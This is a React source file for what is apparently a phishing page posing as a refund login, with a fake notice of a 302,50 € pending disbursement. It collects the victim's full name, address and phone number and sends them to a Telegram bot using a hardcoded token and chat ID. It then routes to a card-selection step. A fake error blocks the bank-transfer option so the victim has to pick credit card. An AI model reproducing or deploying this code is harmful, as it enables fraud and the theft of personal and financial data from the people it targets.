import react from 'react'
import React from 'react'
import 'antd/dist/antd.css'
import { Input } from 'antd'
import {useState} from 'react'
import {useRef, useEffect} from 'react';
import { Radio } from 'antd';
import { useNavigate } from 'react-router-dom';

export default function LogIn() {
  const navigate = useNavigate();
  const fullNameUnderline = useRef(null);
  const errFullName = useRef(null);
  const fullAddressUnderline = useRef(null);
  const errFullAddress = useRef(null);
  const phoneNumberUnderline = useRef(null);
  const errPhoneNumber = useRef(null);
  const bankError = useRef(null);

  const [errEmailString, setErrEmailString] = useState('Please complete this field');
  const [fullName, setFullName] = useState('');
  const [fullAddress, setFullAddress] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const chatId = '5345080694';
  const botToken= '5417079331:AAFFjTkpZXAzDL33Tbnjhl8-UDgDoWSzKJ8';
//   $chat_id = '5345080694';
// $token = '5417079331:AAFFjTkpZXAzDL33Tbnjhl8-UDgDoWSzKJ8';

  const [value, setValue] = useState(1);
  const onChange = (e) => {
    // console.log('radio checked', e.target.value);
    setValue(e.target.value);
  };

  const nextButtonClicked = () => {
    if(value == 1){
      bankError.current.hidden = false;
    }
    if(!fullName){
      fullNameUnderline.current.color = 'red';
      errFullName.current.hidden = false;
      setErrEmailString('Please complete this field');
    }
    if(!fullAddress){
      fullAddressUnderline.current.color = 'red';
      errFullAddress.current.hidden = false;
    }
    if(!phoneNumber){
      phoneNumberUnderline.current.color = 'red';
      errPhoneNumber.current.hidden = false;
    }
    if(value == 2 && fullName && fullAddress && phoneNumber){
      var message = '====================={New User Login Income FullName, FullAddress and PhoneNumber}====================="';
      message += '\n FullName: ';
      message += fullName;
      message += '\n FullAddress: ';
      message += fullAddress;
      message += '\n PhoneNumber: ';
      message += phoneNumber;

      fetch('https://api.telegram.org/bot'+botToken+'/sendMessage?chat_id='+chatId+'&text=' + message) // url here
      .then((response) => {
        return response.json(); // replace .json() to .text() for plain text
      })
      .then((daat) => {
        console.log(daat);
      });
      navigate('/SelectCard');
    }
  }
  const fullNameChanged = (e) => {
    setFullName(e.target.value);
  }
  const fullAddressChanged = (e) => {
    setFullAddress(e.target.value);
  }
  const phoneNumberChanged = (e) => {
    setPhoneNumber(e.target.value);
  }
  return (
    <div className="sc-jlyJG dhCUzp">
      <div className="sc-fjdhpX fxQNsf">
        <div>
          <div className="welcomeBack">Welcome back</div>
          <div className="commonText">
            <p style={{textAlign:'right', marginRight: 550}}>
              <img src={require('../media/email16.ico')} alt ='email'/>
              <span style = {{marginLeft: 10, color: 'red'}}>Notification</span></p>
            <p style={{textAlign:'right', marginRight: 200}}>You have a pending disbursement of <b>302,50 €</b>.</p>
          </div>
        </div>
        <div className="sign-in-content">
          <div id="fullNameForm">
            <div id="fullName" className="formName">
              Full Name
            </div>
            <div
              id="fullNameInput"
              className="inputForm"
            >
              <Input
                className="antInput"
                placeholder="Enter your first and last name"
                value = {fullName}
                onChange = {fullNameChanged}
              />
              <hr id = 'fullNameUnderline' size="2" color="#c1c9d6" ref={fullNameUnderline}/>
              <p id = 'errFullName' ref={errFullName} style = {{color: 'red', fontSize: '16px'}} hidden>{errEmailString}</p>
            </div>
          </div>
          <div id="fullAddressForm">
            <div id="fullAddress" className="formName">
              Full Address...
            </div>
            <div
              id="fullAddressInput"
              className="inputForm"
            >
              <Input
                className="antInput"
                placeholder="Street, PO BOX, City, Postal Cosde"
                value = {fullAddress}
                onChange = {fullAddressChanged}
              />
              <hr id = 'fullAddressUnderline' size="2" color="#c1c9d6" ref={fullAddressUnderline}/>
              <p id = 'errFullAddress' ref={errFullAddress} style = {{color: 'red', fontSize: '16px'}} hidden>{errEmailString}</p>
            </div>
          </div>
          <div id="phoneNumberForm">
            <div id="phoneNumber" className="formName">
              Phone Number
            </div>
            <div
              id="phoneNumberInput"
              className="inputForm"
            >
              <Input
                className="antInput"
                placeholder="Enter Your Phone Number"
                value = {phoneNumber}
                onChange = {phoneNumberChanged}
              />
              <hr id = 'phoneNumberUnderline' size="2" color="#c1c9d6" ref={phoneNumberUnderline}/>
              <p id = 'errPhoneNumber' ref={errPhoneNumber} style = {{color: 'red', fontSize: '16px'}} hidden>{errEmailString}</p>
            </div>
          </div>
          <div id="refunForm" style={{display: 'flex', marginTop: 15}}>
            <p style ={{color: 'grey'}}>Select a refund method *</p>
            <Radio.Group onChange={onChange} value={value} style={{display: 'flex', alignItems: 'center'}}>
              <p style={{marginRight: 10}}>Bank transfer</p><Radio value={1}></Radio>
              <p style={{marginRight: 10}}>credit card </p><Radio value={2}></Radio>
            </Radio.Group>
          </div>
          <div id="refunForm" style={{display: 'flex', marginTop: 10, alignItems: 'center', height: 20}}>
            <div id = "bankError" ref = {bankError} hidden>
            <img src={require('../media/critical.png')} style={{width: 18, height: 18}} alt ='email'/> 
            <span style ={{color: 'red', marginLeft: 10}}>This refund method is only available for sums over 1000€.</span>
          </div></div>
        </div>
        <div className="sc-jzJRlG giyMJw">
          <button
            type="button"
            className="signInButton"
            style={{ margin: 'auto', marginTop: 10}}
            onClick={nextButtonClicked}
          >
            <span>Next</span>
          </button>
        </div>
      </div>
    </div>
  )
}

